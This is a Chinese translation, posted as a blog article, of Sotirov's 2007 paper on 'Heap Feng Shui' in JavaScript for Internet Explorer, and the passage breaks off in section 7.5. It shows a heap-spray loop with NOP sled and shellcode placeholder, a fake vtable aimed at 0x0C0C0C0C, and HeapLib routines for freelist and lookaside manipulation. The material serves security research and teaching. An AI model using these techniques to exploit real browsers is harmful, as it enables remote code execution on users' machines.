---
title: 文献翻译 | JavaScript 中的“堆风水”
category: binary
---

# {{ page.title }}

## 元信息

> 如果没有岁月匆忙的交错 你还在原地等着我  
> 还有在故乡的山冈上 在大多数宁静的深夜  
> 我会想起你 很容易就想起你

这是毕业设计中的外文翻译部分。久闻“堆风水”大名，这两天读完这篇优秀的开山之作，感觉很充实。

终于要毕业了。

回顾过往，我做了所有需要智慧或者毅力亦或勇气的事。因此没有后悔，只有随时间流逝的遗憾。

其余皆如所愿。

我看青山多妩媚，青山说你可拉倒吧。

OK. Das ist alles.

The original paper is *Heap Feng Shui in JavaScript* by Alexander Sotirov, published on Blackhat 2007.

## 1 简介

从 XP SP2 开始，Windows 平台上堆破坏型漏洞的利用变得愈加困难。一些堆保护机制，如安全 unlink 和堆 cookie，已经能够成功阻止大多数普通的堆利用技术。绕过堆保护机制的方法是存在的，但是它们需要我们能够在很大程度上控制有漏洞的应用的内存分配方式。

本文将介绍一种新的技术，它能借助特定顺序的 JavaScript 内存分配来实现对浏览器堆布局的精确控制。我们将展示一个 JavaScript 库，库函数能够帮助我们在触发堆破坏漏洞前将堆设定为一个被控制的状态。这使得我们能够以很高的可靠度和精确度去攻击利用起来非常困难的堆破坏漏洞。

我们将聚焦于 IE 浏览器（后文简称 IE）的漏洞利用，但是这里展示的一般性技术也可能适用于其他浏览器或脚本环境。

## 2 现有技术

在浏览器堆漏洞利用中，SkyLined 为他的 IE IFRAME 漏洞利用程序开发的堆喷技术应用[1]最为广泛。该技术借助 JavaScript 创建多个包含一个 NOP 片段和 shellcode 的字符串。JavaScript 运行时将每一个字符串的数据储存在堆上的一个新块中。堆分配通常始于地址空间的开头，并向上增长。在为字符串分配 200MB 内存后，任何位于 50MB 到 200MB 之间的地址将很可能命中 NOP 片段。使用这个范围内的地址覆盖返回地址或函数指针将导致控制流跳转到 NOP 片段并执行 shellcode。

下面的 JavaScript 代码段展示了这项技术：

```js
var nop = unescape("%u9090%u9090");

// 创建一个 1MB 大小、包含 NOP 指令、后面跟着 shellcode 的字符串：
//
// malloc header   string length   NOP slide   shellcode   NULL terminator
// 32 bytes        4 bytes         x bytes     y bytes     2 bytes
while (nop.length <= 0x100000/2) nop += nop;

nop = nop.substring(0, 0x100000/2 - 32/2 - 4/2 - shellcode.length - 2/2);

var x = new Array();

// 将 200MB 内存用 NOP 片段和 shellcode 填充
for (var i = 0; i < 200; i++) {
    x[i] = nop + shellcode;
}
```

将该技术稍作变化，就可以用于覆盖虚函数表和对象指针。如果一个对象指针被用于虚函数调用，编译器将生成类似下面这样的代码段：

```assembly
mov  ecx, dword ptr [eax]   ; 获得虚表地址
push eax                    ; 将 C++ 对象的 this 指针作为第一个参数传入
call dword ptr [ecx+08h]    ; 调用虚表偏移 0x8 处的函数
```

每个 C++ 对象的前 4 个字节都是一个指向虚表的指针。为了利用被覆盖的对象指针，我们需要一个指向伪造对象的地址，这个对象拥有一个伪造虚表，该虚标包含指向 shellcode 的指针。在内存中设置这样一个结构并不像看上去那么难。第一步是用一个 0xC 字符序列作为 NOP 片段，并将对象指针覆盖为指向该片段的地址。该伪造对象开头的虚表指针来自 NOP 片段，指向 0x0C0C0C0C。这个地方的内存同样包含来自 NOP 片段的 0xC 字节，且伪造虚表中的所有虚函数指针均指向 0x0C0C0C0C 处的 NOP 片段。调用这个对象的任何虚函数都将导致 shellcode 被执行。

地址引用之间的关系如下：

![Bildschirmfoto 2019-03-10 um 2.54.42 P]({{ site.url }}/images/heapfengshui/a.png)

SkyLined 的技术中，核心在于 JavaScript 代码能够访问系统堆。本文将这个想法进一步发展，并探索更多的方法来使用 JavaScript 控制堆。

## 3 动机

上面介绍的堆喷技术出奇有效，但为了达到稳定的堆利用效果，仅仅使用它还是不够的。主要有两个原因。

在 Windows XP SP2 及之后的系统上，通过覆盖堆上的应用程序数据来利用堆破坏漏洞，要比破坏堆内部的 malloc 数据结构体简单。堆分配器会对 malloc chunk 头部和双向空闲链表做额外验证，这使得常规的堆利用方法不再有效。因此，许多漏洞利用程序适用堆喷技术将 shellcode 填满地址空间，然后尝试覆盖堆上的对象或虚表指针。操作系统的堆保护机制并不关心内存中的应用程序数据。然而，堆的状态难以预测，我们无法保证被覆盖的内存一直包含相同的数据。在这种情况下，攻击将会失败。

一个例子是 Metasploit 框架中的 ie_webview_setslice 漏洞利用程序。它重复地触发一个堆破坏漏洞，目的是弄乱堆内存，直到使控制流跳转到任意的堆内存地址上。即使这个利用程序总是不成功，也不足为奇。

第二个问题是可靠性和堆喷消耗的系统内存数量之间的权衡。如果一个漏洞利用程序将浏览器的整个地址空间都填充为 shellcode，那么任意跳转都会导致攻击成功。不幸的是，在物理内存不足的系统上，堆喷将严重消耗分页文件和降低系统性能。如果用户在堆喷完成之前关掉浏览器，攻击将会失败。

本文将展示一个能够解决这两个问题的方案，使得既可靠又精准的漏洞利用成为可能。

## 4 IE 堆技术内幕

### 4.1 概览

IE 中的三个用于内存分配的主要组件是浏览器堆漏洞利用的典型。第一个是 MSHTML.DLL 库，负责当前展示页面中 HTML 元素的内存管理。它在页面初始加载及后续 DHTML 控制时会分配内存。这些内存来自进程默认堆，在页面关闭或 HTML 元素销毁时将被释放。

第二个管理内存的组件是 位于 JSCRIPT.DLL 中的 JavaScript 引擎。新创建的 JavaScript 对象所需的内存来自 JavaScript 专用堆，字符串则是例外，它们位于进程默认堆。当总内存消耗或对象数超过特定阈值时，未引用对象会被垃圾回收器销毁。垃圾回收器也可以通过 `CollectGarbage()` 函数显式调用。

最后一个大多数浏览器漏洞利用程序会涉及的组件是 ActiveX 控件，它会导致堆破坏。有些 ActiveX 控件使用一个专用堆，但是大多数都会在进程默认堆上进行内存的分配，以及内存的破坏。

重点在于，所有这三个组件都使用同一个进程默认堆。这意味着，借助 JavaScript 分配和释放内存都将改变 MSHTML 和 ActiveX 控件使用的堆的布局，而存在于 ActiveX 控件中的堆破坏漏洞可以用来覆盖由其他两个组件分配来的内存。

### 4.2 JavaScript 字符串

JavaScript 引擎使用 MSVCRT 的 malloc() 和 new() 函数来完成大多数的内存分配，其专用堆则在 CRT 初始化过程中被创建。一个重要的例外是 JavaScript 的字符串数据。它们以 BSTR 字符串[2]的形式被存储，这是一种 COM 接口使用的基本字符串类型。它们的内存由 OLEAUT32.DLL 库中 SysAllocString 系列函数分配，位于进程默认堆。

下面是 JavaScript 中典型的一个字符串分配过程的函数调用回溯：

```
ChildEBP RetAddr  Args to Child
0013d26c 77124b52 77606034 00002000 00037f48 ntdll!RtlAllocateHeap+0xeac
0013d280 77124c7f 00002000 00000000 0013d2a8 OLEAUT32!APP_DATA::AllocCachedMem+0x4f
0013d290 75c61dd0 00000000 00184350 00000000 OLEAUT32!SysAllocStringByteLen+0x2e
0013d2a8 75caa763 00001ffa 0013d660 00037090 jscript!PvarAllocBstrByteLen+0x2e
0013d31c 75caa810 00037940 00038178 0013d660 jscript!JsStrSubstrCore+0x17a
0013d33c 75c6212e 00037940 0013d4a8 0013d660 jscript!JsStrSubstr+0x1b
0013d374 75c558e1 0013d660 00000002 00038988 jscript!NatFncObj::Call+0x41
0013d408 75c5586e 00037940 00000000 00000003 jscript!NameTbl::InvokeInternal+0x218
0013d434 75c62296 00037940 00000000 00000003 jscript!VAR::InvokeByDispID+0xd4
0013d478 75c556c5 00037940 0013d498 00000003 jscript!VAR::InvokeByName+0x164
0013d4b8 75c54468 00037940 00000003 0013d660 jscript!VAR::InvokeDispName+0x43
0013d4dc 75c54d1a 00037940 00000000 00000003 jscript!VAR::InvokeByDispID+0xfb
0013d6d0 75c544fa 0013da80 00000000 0013d7ec jscript!CScriptRuntime::Run+0x18fb
```

为了在堆上分配一个新字符串，我们需要创建一个新的 JavaScript 字符串对象。我们不能简单地将一个字符串直接赋值给一个新变量，因为这样并没有创建该字符串数据的拷贝。相反，我们需要连接两个字符串或使用 `substr` 函数。例如：

```js
var str1 = "AAAAAAAAAAAAAAAAAAAA";  // 没有分配新字符串
var str2 = str1.substr(0, 10);      // 分配了一个长度为 10 字符的新字符串
var str3 = str1 + str2;             // 分配了一个长度为 30 字符的新字符串
```

BSTR 字符串作为一个结构体存储于内存，该结构体包含一个 4 字节域，后面跟着 16 位宽字符形式的字符串数据，以及一个 16 位的 null 结束符。上例的`str1` 字符串在内存中表现形式如下：

![Bildschirmfoto 2019-03-10 um 5.52.29 P]({{ site.url }}/images/heapfengshui/b.png)

我们可以用下面的两个公式来计算一个字符串需要分配多少字节，或者在分配给定数目字节时，对应字符串有多长：

```js
bytes = len * 2 + 6
len = (bytes - 6) / 2
```

这种字符串的存储方式允许我们编写函数通过分配一个新字符串来分配任意大小的内存块。这个函数借助公式 `len = (bytes - 6) / 2` 来计算所需字符串的长度，然后调用 `substr` 去分配一个该长度的新字符串。这个字符串将包含从填充字符串复制来的数据。如果我们想将特定数据放入新内存块，仅需要预先初始化相关的填充字符串即可。

```js
// 使用填充数据创建一个长字符串
padding = "AAAA"

while (padding.length < MAX_ALLOCATION_LENGTH)
    padding = padding + padding;
    
// 分配一个大小为 bytes 的内存块
function alloc(bytes) {
    return padding.substr(0, (bytes-6)/2);
}
```

### 4.3 垃圾回收

为了控制浏览器堆内存布局，仅仅能够分配任意大小的内存块是不够的，我们还需要一个释放内存块的方法。JavaScript 运行时使用简单的“标记-清除”垃圾回收器，Eric Lippert 的博客[3]讲述了关于它的详细内容。

垃圾回收机制由多种启发式算法触发，如依据最近一次运行以来创建的对象数。“标记-清除”算法将标记 JavaScript 运行时中所有未引用的对象并销毁它们。当一个字符串对象被销毁时，OLEAUT32.DLL 中的 SysFreeString 被调用来释放它的数据。下面是垃圾回收器的函数回溯：

```
ChildEBP RetAddr  Args to Child
0013d324 774fd004 00150000 00000000 001bae28 ntdll!RtlFreeHeap
0013d338 77124ac8 77606034 001bae28 00000008 ole32!CRetailMalloc_Free+0x1c
0013d358 77124885 00000006 00008000 00037f48 OLEAUT32!APP_DATA::FreeCachedMem+0xa0
0013d36c 77124ae3 02a8004c 00037cc8 00037f48 OLEAUT32!SysFreeString+0x56
0013d380 75c60f15 00037f48 00037f48 75c61347 OLEAUT32!VariantClear+0xbb
0013d38c 75c61347 00037cc8 000378a0 00036d40 jscript!VAR::Clear+0x5d
0013d3b0 75c60eba 000378b0 00000000 000378a0 jscript!GcAlloc::ReclaimGarbage+0x65
0013d3cc 75c61273 00000002 0013d40c 00037c10 jscript!GcContext::Reclaim+0x98
0013d3e0 75c99a27 75c6212e 00037940 0013d474 jscript!GcContext::Collect+0xa5
0013d3e4 75c6212e 00037940 0013d474 0013d40c jscript!JsCollectGarbage+0x10
```

为了释放我们已经分配的字符串，我们需要删除所有指向它的引用并运行垃圾回收器。幸运的是，我们不必等待某一个启发式算法去触发它，因为 IE 中的 JavaScript 实现提供了一个 `CollectGarbage()` 函数，它能够促使垃圾回收器立即运行。下面的代码展示了该函数的应用：

```js
var str;

// 我们需要在函数范围内进行分配和释放操作，否则垃圾回收器不会释放字符串空间   
function alloc_str(bytes) {
    str = padding.substr(0, (bytes-6)/2);
}

function free_str() {
    str = null;
    CollectGarbage();
}

alloc_str(0x10000); // 分配内存块
free_str();         // 释放内存块
```

上述代码分配了一个 64KB 的内存块并释放了它，这说明我们有能力在进程默认堆中进行任意的内存申请和释放。我们只能释放那些曾经由我们分配的内存，但是在这种限制下，我们仍然拥有很大程的的堆内存布局的控制能力。

### 4.4 OLEAUT32 内存分配器

不幸的是，调用 `SysAllocString` 并不总是能够分配到来自系统堆的内存。这些用于分配和释放 BSTR 字符串的函数使用一个自定义的内存分配器，它位于 OLEAUT32 的 `APP_DATA` 类中。该内存分配器维护一个空闲内存块的缓存，并在未来的内存分配时重用它们。这一点与系统内存分配器维护的快表很类似。

这个缓存包含 4 个 bin，每个 bin 持有 6 个特定大小范围的内存块。当一个内存块被 `APP_DATA:FreeCachedMem()` 函数释放时，它被存储在某一个 bin 中。如果 bin 已经满了，这个 bin 中最小的内存块将被 `HeapFree()` 释放，新的内存块将取代它的位置。大于 32767 字节的内存块不会被缓存，总是直接被释放。

当 `APP_DATA:AllocCachedMem()` 被调用来分配内存时，它会在大小合适的 bin 中查找。如果找到一个足够大的内存块，它将会被移出缓存区，返回给调用者。如果找不到，该函数会调用 `HeapAlloc()` 来分配新的内存。

这个内存分配器的反编译代码如下：

```c
// 缓存区中的每一项都有长度变量和指向空闲块的指针
struct CacheEntry
{
    unsigned int size;
    void* ptr;
}

// 这个缓存区包含 4 个 bin，每个 bin 持有 6 个特定大小范围内的内存块
class APP_DATA
{
    CacheEntry bin_1_32     [6]; // 1～32 字节的块
    CacheEntry bin_33_64    [6]; // 33～64  字节的块
    CacheEntry bin_65_256   [6]; // 65～256  字节的块
    CacheEntry bin_257_32768[6]; // 257～32768  字节的块

    void* AllocCachedMem(unsigned long size);   // 分配函数
    void FreeCachedMem(void* ptr);              // 释放函数
};

//
// 分配内存，重用缓存区中的块
//
void* APP_DATA::AllocCachedMem(unsigned long size)
{
    CacheEntry* bin;
    int i;
    if (g_fDebNoCache == TRUE)
        goto system_alloc;  // 如果缓存被禁用，使用 HeapAlloc
    // 为不同大小的块找到合适的缓存区
    if (size > 256)
        bin = &this->bin_257_32768;
    else if (size > 64)
        bin = &this->bin_65_256;
    else if (size > 32)
        bin = &this->bin_33_64;
    else
        bin = &this->bin_1_32;
    // 遍历 bin 中的所有项
    for (i = 0; i < 6; i++) {
        // 如果缓存块足够大，本次分配就使用它
        if (bin[i].size >= size) {
            bin[i].size = 0; // 大小为 0 意味着没有使用缓存
            return bin[i].ptr;
        }
    }
    
system_alloc:
    // 用系统内存分配器分配内存
    return HeapAlloc(GetProcessHeap(), 0, size);
}

//
// 释放块到缓存
//
void APP_DATA::FreeCachedMem(void* ptr)
{
    CacheEntry* bin;
    CacheEntry* entry;
    unsigned int min_size;
    int i;
    if (g_fDebNoCache == TRUE)
        goto system_free; // 如果缓存被禁用，使用 HeapFree
        
    // 获取正在释放的块的大小
    size = HeapSize(GetProcessHeap(), 0, ptr);
    
    // 找到合适的 bin
    if (size > 32768) 
        goto system_free; // 使用 HeapFree 释放大块
    else if (size > 256)
        bin = &this->bin_257_32768;
    else if (size > 64)
        bin = &this->bin_65_256;
    else if (size > 32)
        bin = &this->bin_33_64;
    else
        bin = &this->bin_1_32;
        
    // 遍历 bin 中所有项找到最小项
    min_size = size;
    entry = NULL;
    for (i = 0; i < 6; i++) {
        // 如果找到未使用的缓存项，把块放在这儿并返回
        if (bin[i].size == 0) {
            bin[i].size = size;
            bin[i].ptr = ptr;       // 空闲块现在在缓存中
            return;
        }
        // 如果我们释放的块已经在缓存中，终止操作
        if (bin[i].ptr == ptr)
            return;
        // 找到最小缓存项
        if (bin[i].size < min_size) {
            min_size = bin[i].size;
            entry = &bin[i];
        }
    }
    // 如果最小缓存项比我们释放的块还小，则用 HeapFree 释放该最小项，并用我们的块替代它的位置
    if (min_size < size) {
        HeapFree(GetProcessHeap(), 0, entry->ptr);
        entry->size = size;
        entry->ptr = ptr;
        return;
    }
    
system_free:
    // 用系统内存分配器释放块
    return HeapFree(GetProcessHeap(), 0, ptr);
}
```

`APP_DATA` 内存分配器使用的缓存算法表现出一个问题，因为只有部分我们申请、释放的内存才调用了系统内存分配器。

### 4.5 “马桶吸”技术

为了确保每个字符串的内存都来自系统堆，对于每个 bin，我们需要分配 6 个大小达到最大值的内存块。由于缓存区每个 bin 最多只能保存 6 个内存块，因此这样做之后缓存区中的所有 bin 都是空的。下一个字符串的内存分配一定会调用 `HeapAlloc()`。

如果我们释放掉刚刚分配的字符串，它将进入缓存区中的某个 bin 中。我们可以通过再连续释放 6 个之前分配过的大小达到最大值的内存块来达到将第一个字符串冲出缓存区。`FreeCachedMem()` 函数将把所有较小的内存块推出缓存区，这样一来，我们的第一个字符串将被 `HeapFree()` 释放。此时，缓存区将是充满状态，因此我们需要通过为每个 bin 再次分配 6 个大小达到最大值的内存块来清空它们。

从效果上来讲，我们先使用 6 个内存块，就像用马桶吸一样，将所有较小块推出缓存区，然后再申请 6 个内存块，仿佛将马桶吸拉回来。

下面的代码展示了“马桶吸”技术的具体实现：

```js
plunger = new Array();

// 这个函数将缓存中的所有块冲走使它变空
function flushCache() {
    // 释放马桶吸中的所有块来把小块推出
    plunger = null;
    CollectGarbage();
    // 从每个 bin 中分配 6 个最大块，使缓存区变空
    plunger = new Array();
    for (i = 0; i < 6; i++) {
        plunger.push(alloc(32));
        plunger.push(alloc(64));
        plunger.push(alloc(256));
        plunger.push(alloc(32768));
    } 
}
flushCache(); // 在进行任何分配前清空缓存区

alloc_str(0x200); // 分配字符串空间

free_str(); // 释放字符串空间兵清空缓存
flushCache();
```

为了将一个块推出缓存区并使用 `HeapFree()` 释放，它的大小必须要比所在 bin 的最大值小，否则，`FreeCachedMem` 中的 `min_size < size` 条件不能被满足，从而导致作为马桶吸的内存块被释放。也就是说，我们不能释放大小分别为 32、64、256 和 32768KB 的内存块，但是这个限制并不是很严重。

## 5 HeapLib —— Javascript 堆控制库

我们在一个叫做 `HeapLib` 的 JavaScript 库中实现了前一节中描述的概念。这个库提供了直接映射到系统内存分配器函数调用上的 `alloc()` 和 `free()`，以及一些高级堆控制例程。

### 5.1 HeapLib 版“你好，世界”

下面是最基础的 `HeapLib` 库演示程序：

```html
<script type="text/javascript" src="heapLib.js"></script>
<script type="text/javascript">
   // 重建一个 适用于 IE 的 heaplib 对象
   var heap = new heapLib.ie();
   heap.gc();      // 在进行任何分配操作前运行垃圾回收器
   // 分配 512 字节内存并用填充自己饿填充
   heap.alloc(512);
   // 为 "AAAAA" 字符串分配新内存块并标记为 "foo"
   heap.alloc("AAAAA", "foo");
   // 释放所有标记为 "foo" 的块
   heap.free("foo");
</script>
```

这个程序分配了一个 16 字节的内存块并将 `"AAAAA"` 字符串复制进去。这个块带有标签 `"foo"`，这个标签在稍后进行 `free()` 时作为参数传入。`free()` 函数将释放所有带有该标签的内存块。

就它对堆的影响而言，上面的“你好，世界”程序和下面的 C 语言代码是等价的：

```c
block1 = HeapAlloc(GetProcessHeap(), 0, 512);
block2 = HeapAlloc(GetProcessHeap(), 0, 16);
HeapFree(GetProcessHeap(), 0, block2);
```

### 5.2 调试

`HeapLib` 提供了一些用于调试该库并审查这个库对堆的影响的函数。下面是展示调试功能的一个小例子：

```js
heap.debug("Hello!");
heap.debugHeap(true); // 启用内存分配追溯
heap.alloc(128, "foo");
heap.debugBreak(); // 在 WinDbg 中中断
heap.free("foo");
heap.debugHeap(false);  // 禁用内存分配追溯
```

我们可以通过将 WinDbg 附加到 IEXPLORER.EXE 进程并设置以下断点来查看调试输出：

```
bc *
bu 7c9106eb "j (poi(esp+4)==0x150000)
   '.printf \"alloc(0x%x) = 0x%x\", poi(esp+c), eax; .echo; g'; 'g';"
bu ntdll!RtlFreeHeap "j ((poi(esp+4)==0x150000) & (poi(esp+c)!=0))
   '.printf \"free(0x%x), size=0x%x\", poi(esp+c), wo(poi(esp+c)-8)*8-8; .echo; g'; 'g';"
bu jscript!JsAtan2 "j (poi(poi(esp+14)+18) == babe)
   '.printf \"DEBUG: %mu\", poi(poi(poi(esp+14)+8)+8); .echo; g';"
bu jscript!JsAtan "j (poi(poi(esp+14)+8) == babe)
   '.echo DEBUG: Enabling heap breakpoints; be 0 1; g';"
bu jscript!JsAsin "j (poi(poi(esp+14)+8) == babe)
   '.echo DEBUG: Disabling heap breakpoints; bd 0 1; g';"
bu jscript!JsAcos "j (poi(poi(esp+14)+8) == babe)
   '.echo DEBUG: heapLib breakpoint'"
bd 0 1
g
```

第一个断点设置在 `ntdll!RtlAllocateHeap` 的 `RET` 指令上。上述地址在 Windows XP SP2 平台上是合法的，但是在其他系统上可能需要调整。断点还假设进程默认堆的地址是 `0x150000`。 `WinDbg` 的 `uf` 和 `!peb` 指令可以给出这些地址：

```
0:012> uf ntdll!RtlAllocateHeap
...
ntdll!RtlAllocateHeap+0xea7:
7c9106e6 e817e7ffff     call    ntdll!_SEH_epilog (7c90ee02)
7c9106eb c20c00         ret 0Ch

0:012> !peb
PEB at 7ffdf000
    ...
    ProcessHeap:    00150000
```

设置断点后，运行上面给出的调用 `HeapLib` 库函数的样例，`WinDbg` 中会有以下输出：

```
DEBUG: Hello!
DEBUG: Enabling heap breakpoints
alloc(0x80) = 0x1e0b48
DEBUG: heapLib breakpoint
eax=00000001 ebx=0003e660 ecx=0003e67c edx=00038620 esi=0003e660 edi=0013dc90
eip=75ca315f esp=0013dc6c ebp=0013dca0 iopl=0         nv up ei ng nz ac pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000296
jscript!JsAcos:
75ca315f 8bff            mov     edi,edi
0:000> g
DEBUG: Flushing the OLEAUT32 cache
                      free(0x1e0b48), size=0x80
DEBUG: Disabling heap breakpoints
```

可以看到，`alloc()` 函数在 `0x1e0b48` 处分配了 0x80 字节内存，且这个地方的内存稍后被 `free()` 释放。这个样例程序还通过调用 `HeapLib` 中的 `debugBreak()` 函数在 WinDbg 中触发了一个断点。该函数的具体实现是对 JavaScript `acos()` 带特别的参数进行调用，从而触发 WinDbg 设置在 `jscript!JsAcos` 的断点。这给我们在 JavaScript 继续执行前审查堆状态的机会。

### 5.3 实用函数

这个库还提供了一些函数，可以控制漏洞利用过程中使用到的数据。下面是一个使用 `addr()` 和 `padding()` 函数来准备一个伪造虚表块的例子：

```js
var vtable = "";
for (var i = 0; i < 100; i++) {
    // 向虚表中添加 100 个 0x0C0C0C0C 地址拷贝
    vtable = vtable + heap.addr(0x0C0C0C0C);
}
// 用 "A" 填充虚表，使块大小为 1008 字节
vtable = vtable + heap.padding((1008 - (vtable.length*2+6))/2);
```

下一节的函数描述将给出更多相关细节。

## 6 HeapLib 库参考

### 6.1 面向对象接口

`HeapLib` API 作为面向对象接口实现。为了在 IE 中使用 API，我们要创建一个 `heapLib.ie` 类的实例。

| 构造函数 | 说明 |
| :-- | :-- |
| heapLib.ie(maxAlloc, heapBase) | 创建一个适用于 IE 浏览器的 heapLib API 对象。maxAlloc 参数设置了 alloc() 函数可分配的最大块大小。 <br /> <br />参数: <br />maxAlloc - 能够分配的最大字节数 (默认是 65535) <br />heapBase - 进程默认堆的基址 (默认是 0x150000)|

下面讲解的所有函数都是 `heapLib.ie` 类的方法。

### 6.2 调试

为了观察调试输出信息，使用 WinDbg 附加到 IEXPLORER.EXE 进程并按照前述方法设置断点。如果调试器不可用，那么下面的函数将同样不起作用。

| 函数 | 说明 |
| :-- | :-- |
| debug(msg) | 在 WinDbg 中输出调试消息。 msg 参数必须是字面字符串。使用字符串连接来创建消息会导致堆分配。 <br /> <br />参数：<br />msg - 要输出的字符串|
|debugHeap(enable)|在 WinDbg 中启用或禁用堆操作日志。<br /><br />参数：<br />enable - 一个布尔值，设置为真则启用日志|
|debugBreak()|在调试器中触发断点。|

### 6.3 实用函数

| 函数 | 说明 |
| :-- | :-- |
|padding(len)|返回包含 "A" 字符的特定长度的字符串，该长度不大于 heapLib.ie 构造函数中给定的最大分配值。<br /><br />参数：<br />len - 字符串长度<br /><br />例子：<br />`heap.padding(5)            // 返回 "AAAAA"`|
|round(num, round)|返回向上取整到指定值倍数的整数。<br /><br />参数：<br />num - 用于向上取整的整数<br />round - 取整的指定值<br /><br />例子：<br />`heap.round(210, 16)        // 返回 224`|
|hex(num, width)|将整数转换为十六进制字符串。这个函数会用到堆。<br /><br />参数：<br />num - 待转换数字<br />width - 将输出用 0 填充到指定宽度(可选)<br /><br />例子：<br />`heap.hex(210, 8)           // 返回 "000000D2"`|
|addr(addr)|将一个 32 位地址转换为内存地址表示方式的 4 字节字符串。这个函数会用到堆。<br /><br />参数：<br />addr - 代表地址的整数<br /><br />例子：<br />`heap.addr(0x1523D200)      // 返回值等价于 unescape("%uD200%u1523")`|

### 6.4 内存分配

| 函数 | 说明 |
| :-- | :-- |
|alloc(arg, tag)|用系统分配器分配指定大小的内存块。调用该函数等价于调用 HeapAlloc()。如果第一个参数是数字，它指定了填满 "A" 字符的新块大小。如果是字符串，它的数据将被复制到一个大小为 `arg.length * 2 + 6` 的新块中。无论哪种情况，新块的大小必须是 16 的整数倍，且不等于 32、64、256 和 32768。<br /><br />参数：<br />arg - 新块的字节长度，或者是进行 strdup 的字符串<br />tag - 内存块标签(可选)<br /><br />例子：<br />`heap.alloc(512, "foo") // 分配一个标记为 "foo" 的 512 字节内存块并用 "A" 填充`<br />`heap.alloc("BBBBB") // 分配一个无标签的 16 字节块并将 "BBBBB" 拷贝进去`|
|free(tag)|用系统内存分配器释放带有特定标签的所有内存块。调用该函数等价于调用 HeapFree()。<br /><br />参数：<br />tag - 用于区别被释放块的标签<br /><br />例子：<br />`heap.free("foo")     // 释放所有带有 "foo" 标签的内存块`|
|gc()|运行垃圾回收器并清除 OLEAUT32 缓存区。在 alloc() 和 free() 之前调用这个函数。|

### 6.5 堆控制

下列函数用于在 Windows 2000、XP 和 2003 平台上操控堆分配器的数据结构。由于显著差异，它们不支持 Windows Vista 中的堆内存分配器。

| 函数 | 说明 |
| :-- | :-- |
|freeList(arg, count)|向空表添加指定大小的内存块，并确保它们不会被合并。在调用这个函数之前，必须清除堆碎片。如果内存块小于 1024 字节，你必须保证快表是满的。<br /><br />参数：<br />arg - 新块的字节长度，或者是进行 strdup 的字符串<br />count - 加入空表的空闲块个数(默认是 1)<br /><br />例子：<br />`heap.freeList("BBBBB", 5) // 向空表中添加 5 个包含 "BBBBB" 字符串的块`|
|lookaside()|向快表中添加指定长度的块。在调用该函数前，快表必须是空的。<br /><br />参数：<br />arg - 新块的字节长度，或者是进行 strdup 的字符串<br />count - 加入快表的空闲块个数(默认是 1)<br /><br />例子：<br />`heap.lookaside("BBBBB", 5) // 向快表中添加 5 个包含 "BBBBB" 字符串的块`|
|lookasideAddr()|返回维护指定大小块的快表链表头的地址。使用来自构造函数 heapLib.ie 的 heapBase 参数。<br /><br />参数：<br />arg - 新块的字节长度，或者是进行 strdup 的字符串<br /><br />例子：<br />`heap.lookasideAddr("BBBBB") // 返回 0x150718`|
|vtable(shellcode, jmpecx, size)|返回包含 shellcode 的伪造虚表。调用者应该将虚表释放到快表中并使用快表地址作为对象指针。当虚表被使用时，对象地址一定在 eax 中且指向虚表的指针一定在 ecx 中。在 ecx+8 到 ecx+0x80 范围内任何通过虚表的虚函数调用都将导致 shellcode 被执行。这个函数会使用堆。<br /><br />参数：<br />shellcode - shellcode 字符串<br />jmpecx - jmp ecx 跳板或其他等价指令的地址<br />size - 生成的虚表大小 (默认是 1008 bytes)<br /><br />例子：<br />`heap.vtable(shellcode, 0x4058b5) // 生成 1008 字节长的、带有指向 shellcode 指针的虚表`|

## 7 使用 HeapLib 库

### 7.1 堆的去碎片化

对于漏洞利用来说，堆碎片化是一个严重的问题。如果堆从空状态开始，堆内存分配器“决定论”允许我们计算经过特定顺序内存分配后堆的状态。不幸的是，我们并不清楚攻击开始时堆的状态，这就会导致堆内存分配器的行为变得不可预测。

为了解决这个问题，我们需要清除堆碎片。这可以通过分配大量的内存块来完成——这些内存块的大小是我们后面的漏洞利用需要的。这些块可以将堆上的所有洞填满，保证接下来同样大小的内存块会在堆末端分配。此时，堆分配器的行为与从空堆开始是等价的。

下面的代码将借助大小为 `0x2010` 字节的块来清除堆碎片：

```js
for (var i = 0; i < 1000; i++)
    heap.alloc(0x2010);
```

### 7.2 释放内存块到空闲链表

假设有一段代码从堆中分配了一个内存块，并且没有初始化就使用。如果我们控制这个块中的数据，就能进行漏洞利用。我们需要分配一个相同大小的内存块，用数据将它填满，然后释放。下一次同样大小的内存分配将得到这个块。

唯一的障碍是系统内存分配器中的合并算法。如果我们释放的块紧挨另一个空闲块，它们就会合并为更大的内存块，这样一来，下一次内存分配将无法拿到包含我们的填充数据的内存块。为了避免这一点，我们将申请 3 个同样大小的内存块，然后释放中间的那个。预先的堆碎片清除工作使得这 3 个内存块是连续的，且中间的内存块不会被合并。

```js
heap.alloc(0x2020);             // 分配 3 个连续块
heap.alloc(0x2020, "freeList");
heap.alloc(0x2020);
heap.free("freeList");          // 释放中间的块
```

`HeapLib` 库提供了一个方便使用的函数来实现上述技巧。下面的例子展示了如何向空闲链表中增加一个大小为 `0x2020` 字节的内存块：

```js
heap.freeList(0x2020);
```

### 7.3 清空快表

为了清空快表中维持特定大小内存块的链，我们需要分配足够多该大小的块。通常每条快表链包含的块数不超过 4，但是我们在 XP SP2 上也见到过有更多块的快表链。为了保险起见，我们将分配 100 个块。下面的代码展示了这个操作：

```js
for (var i = 0; i < 100; i++)
    heap.alloc(0x100);
```

### 7.4 释放内存块到快表

一旦快表为空，我们释放的大小相符的块将被放入。

```js
// 清空快表
for (var i = 0; i < 100; i++)
    heap.alloc(0x100);
    
// 分配块
heap.alloc(0x100, "foo");

// 释放到快表
heap.free("foo");
```

`HeapLib` 中的 `lookaside()` 函数实现了这个技巧：

```js
// 清空快表
for (var i = 0; i < 100; i++)
    heap.alloc(0x100);
    
// 向快表中添加 3 个块
heap.lookaside(0x100);
```

### 7.5 借助快表攻击对象指针

一个内存块被放入快表之后的事情非常有趣。我们从一个空的快表链说起。如果堆的基址是 `0x150000`，维护大小为 1008 字节内存块的快表链表头的地址将是 `0x151e58`。快表链是空的，因此这个地方将有一个 `NULL` 指针。

现在我们释放一个 1008 字节内存块。`0x151e58` 处的快表链表头将指向它，同时该块的前 4 个字节将被覆盖为一个 `NULL`，用来表明表尾。内存结构看起来正是我们利用一个被覆盖的对象指针所需要的：

![Bildschirmfoto 2019-03-11 um 10.50.31 A]({{ site.url }}/images/heapfengshui/c.png)

